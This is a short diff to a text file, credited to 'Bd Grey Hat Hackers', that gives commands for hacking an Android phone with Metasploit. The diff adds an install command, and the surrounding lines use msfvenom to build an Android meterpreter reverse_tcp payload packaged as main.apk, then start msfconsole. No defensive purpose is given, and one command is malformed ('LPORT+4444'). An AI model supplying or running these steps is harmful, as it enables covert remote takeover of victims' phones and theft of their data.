@@ -3,6 +3,9 @@ Collected From Bd Grey Hat Hackers
 
 How to hack android phone using Metasploit.
 Commands - 
+
+apt install metasploit-framework
+
 1. msfvenom -p android/meterpreter/reverse_tcp LHOST="Your Ip" LPORT+4444 R > main.apk
 
 2. msfconsole
